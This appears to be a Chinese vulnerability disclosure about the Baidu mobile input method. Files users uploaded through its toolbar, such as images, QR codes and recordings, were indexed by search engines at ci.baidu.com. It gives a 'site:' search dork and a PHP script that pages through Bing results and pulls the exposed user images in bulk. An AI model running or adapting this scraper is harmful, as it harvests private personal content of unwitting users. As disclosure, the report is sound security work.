简要描述：

新版百度手机输入法增加贴心功能导致用户信息泄露

详细说明：

百度手机输入法最新版增加了工具条，为了用户方便可以发送图片、二维码、录音存储在云端，由于不严谨造成信息被搜索引擎抓取。造成了大量的用户内容被泄露，其中有不少个人重要信息。

因为这个东西不需要任何技术，危害程度是普通网民就可以发生的。

所以危害等级自己认为至少中。

漏洞证明：

Google或者bing：

输入关键词：site:ci.baidu.com

[bing=80,000 条结果],[Google=约 约 308 条结果 ]

提供一个方便查看的方式。

<?php

error_reporting(0);

set_time_limit(0);

$url = 'http://cn.bing.com/search?q=site%3Aci.baidu.com&go=&qs=n&form=QBRE&pq=site%3Aci.baidu.com&sc=0-0&sp=-1&sk=&first={num}';

$i = ($_GET['i']-1)*10;

$api = file_get_contents(str_replace('{num}',$i,$url));

preg_match_all('/<a href=\"http:\/\/ci.baidu.com\/([a-zA-Z0-9]+)?\"/',$api,$a);



foreach($a[1] as $v) {



    $tl='http://ci.baidu.com/'.$v;

    $ttt = file_get_contents($tl);

    preg_match_all('/(<img src="http:\/\/bs.baidu.com\/imemmi\/.*?\/>)/is',$ttt,$aa);



    if($aa[0]){

        echo '<p>';

        echo '<a target="_blank" href="'.$tl.'">';

        echo $aa[0][0];

        echo '</a>';

        echo '</p>';

    }

}

?>
